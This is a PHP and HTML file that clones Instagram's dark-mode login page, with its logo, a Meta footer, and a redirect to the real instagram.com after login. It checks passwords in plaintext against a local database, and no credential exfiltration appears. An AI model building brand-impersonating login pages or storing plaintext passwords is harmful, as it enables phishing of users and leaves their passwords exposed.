<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

require 'db.php';

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || empty($_POST['csrf_token']) || !hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
        $message = "CSRF token validation failed. Please try again.";
    } else {
        $action = $_POST['action'] ?? '';

        if ($action === 'login_process') {
            $username = trim($_POST['username'] ?? '');
            $password = $_POST['password'] ?? '';

            if (!empty($username) && !empty($password)) {
                $stmt = $conn->prepare("SELECT id, username, password FROM users WHERE username = ?");
                if ($stmt) {
                    $stmt->bind_param("s", $username);
                    $stmt->execute();
                    $result = $stmt->get_result();

                    if ($result->num_rows === 1) {
                        $user = $result->fetch_assoc();

                        if ($password === $user['password']) {
                            session_regenerate_id(true);
                            $_SESSION['user_id'] = $user['id'];
                            $_SESSION['username'] = $user['username'];
                            header("Location: https://instagram.com");
                            exit();
                        } else {
                            $message = "Incorrect password. Please try again.";
                        }
                    } else {
                        $message = "The username you entered doesn't belong to an account. Please check your username and try again.";
                    }
                    $stmt->close();
                }
            }
        }
    }
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; 
            -webkit-tap-highlight-color: transparent; 
        }
        body { 
            background-color: #121212; /* Kalar duhun Instagram ta asali */
            color: #ffffff; 
            min-height: 100vh; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .container { 
            width: 100%; 
            max-width: 440px; 
            padding: 24px 28px; 
            display: flex; 
            flex-direction: column; 
            height: 98vh; 
            justify-content: space-between; 
        }
        .top-navigation { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 10px 0; 
        }
        .back-btn { 
            color: #ffffff; 
            font-size: 24px; 
            text-decoration: none; 
            font-weight: 300;
        }
        .lang-selector { 
            color: #a8a8a8; 
            font-size: 14px; 
            cursor: pointer; 
            display: flex; 
            align-items: center; 
            gap: 4px; 
        }
        .main-content { 
            flex-grow: 1; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            margin-top: -10px;
        }
        .logo-wrapper { 
            text-align: center; 
            margin-bottom: 50px; 
        }
        .insta-icon-svg { 
            width: 76px; 
            height: 76px; 
        }
        .form-group { 
            margin-bottom: 14px; 
        }
        .input-field { 
            width: 100%; 
            background-color: transparent; 
            border: 1px solid #3a3a3c; 
            border-radius: 12px; 
            padding: 18px 16px; 
            color: #ffffff; 
            font-size: 15px; 
            outline: none; 
        }
        .input-field:focus {
            border-color: #555557;
        }
        .input-field::placeholder {
            color: #727272;
        }
        .login-btn { 
            width: 100%; 
            background-color: #0074e4; 
            color: #ffffff; 
            border: none; 
            border-radius: 30px; 
            padding: 16px; 
            font-size: 15px; 
            font-weight: 600; 
            cursor: pointer; 
            margin-top: 10px; 
        }
        .forgot-link { 
            display: block; 
            text-align: center; 
            color: #ffffff; 
            text-decoration: none; 
            font-size: 15px; 
            font-weight: 500; 
            margin-top: 30px; 
        }
        .footer-section { 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            gap: 20px; 
            padding-bottom: 15px; 
        }
        .create-account-btn { 
            width: 100%; 
            background-color: transparent; 
            color: #4bb4f8; 
            border: 1px solid #3a3a3c; 
            border-radius: 30px; 
            padding: 14px; 
            font-size: 15px; 
            font-weight: 600; 
            text-align: center; 
            text-decoration: none; 
        }
        /* Gyaran tsarin kalar Meta logo */
        .meta-logo { 
            color: #a8a8a8; 
            font-size: 15px; 
            display: flex; 
            align-items: center; 
            gap: 6px; 
            font-weight: 500; 
            letter-spacing: 0.5px;
            opacity: 0.85;
        }
        .meta-logo svg { 
            width: 18px; 
            height: 18px; 
            fill: #a8a8a8; 
        }
        .alert { 
            padding: 12px; 
            border-radius: 10px; 
            margin-bottom: 25px; 
            text-align: center; 
            font-size: 14px; 
            background-color: rgba(255, 75, 75, 0.1); 
            color: #ff6b6b; 
            border: 1px solid rgba(255, 75, 75, 0.15); 
        }
    </style>
</head>
<body>
<div class="container">
    <div class="top-navigation">
        <a href="#" class="back-btn">&#x2190;</a>
        <div class="lang-selector">English (UK) <span>▼</span></div>
    </div>
    
    <div class="main-content">
        <div class="logo-wrapper">
            <svg class="insta-icon-svg" viewBox="0 0 100 100">
                <defs>
                    <linearGradient id="insta-gradient-lines" x1="15%" y1="90%" x2="85%" y2="10%">
                        <stop offset="0%" stop-color="#FED373" />
                        <stop offset="14%" stop-color="#F15245" />
                        <stop offset="41%" stop-color="#D92E7F" />
                        <stop offset="70%" stop-color="#9B36B7" />
                        <stop offset="100%" stop-color="#515ECF" />
                    </linearGradient>
                </defs>
                <rect x="8" y="8" width="84" height="84" rx="24" fill="none" stroke="url(#insta-gradient-lines)" stroke-width="7.5"></rect>
                <circle cx="50" cy="50" r="20" fill="none" stroke="url(#insta-gradient-lines)" stroke-width="7.5"></circle>
                <circle cx="71" cy="29" r="4.5" fill="url(#insta-gradient-lines)"></circle>
            </svg>
        </div>
        
        <?php if (!empty($message)): ?>
            <div class="alert"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        
        <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" method="POST">
            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token'] ?? ''); ?>">
            <input type="hidden" name="action" value="login_process">
            <div class="form-group">
                <input type="text" name="username" class="input-field" placeholder="Username, email address or mobile number" required>
            </div>
            <div class="form-group">
                <input type="password" name="password" class="input-field" placeholder="Password" required>
            </div>
            <button type="submit" class="login-btn">Log in</button>
        </form>
        <a href="#" class="forgot-link" onclick="alert('Please contact support.'); return false;">Forgotten password?</a>
    </div>

    <div class="footer-section">
        <a href="register.php" class="create-account-btn">Create new account</a>
        <div class="meta-logo">
            <!-- Wannan shi ne asalin siffar infinity loop na Meta logo -->
            <svg viewBox="0 0 24 24">
                <path d="M16.5 6.25c-1.32 0-2.54.58-3.41 1.58-.6-.72-1.39-1.22-2.27-1.44a5.16 5.16 0 0 0-4.07.69C5.1 8.16 4.18 9.77 4.18 11.6c0 1.83.92 3.44 2.57 4.52A5.19 5.19 0 0 0 10.82 17c1.32 0 2.54-.58 3.41-1.58.6.72 1.39 1.22 2.27 1.44a5.16 5.16 0 0 0 4.07-.69c1.65-1.08 2.57-2.69 2.57-4.52 0-1.83-.92-3.44-2.57-4.52a5.19 5.19 0 0 0-4.07-.88zm3.25 7.73a3.15 3.15 0 0 1-2.48.42c-.75-.18-1.42-.66-1.89-1.33.65-.8 1.51-1.34 2.47-1.54a3.17 3.17 0 0 1 2.48.42c.87.57 1.36 1.45 1.36 2.44 0 .99-.49 1.87-1.36 2.44A3.13 3.13 0 0 1 19.75 14zM4.25 11.6c0-.99.49-1.87 1.36-2.44a3.14 3.14 0 0 1 2.48-.42c.75.18 1.42.66 1.89 1.33-.65.8-1.51 1.34-2.47 1.54a3.17 3.17 0 0 1-2.48-.42A3.11 3.11 0 0 1 4.25 11.6zm6.57 3.28a3.15 3.15 0 0 1-2.48-.42c-.87-.57-1.36-1.45-1.36-2.44 0-.99.49-1.87 1.36-2.44a3.14 3.14 0 0 1 2.48-.42c.75.18 1.42.66 1.89 1.33-.65.8-1.51 1.34-2.47 1.54z"/>
            </svg>
            Meta
        </div>
    </div>
</div>
</body>
</html>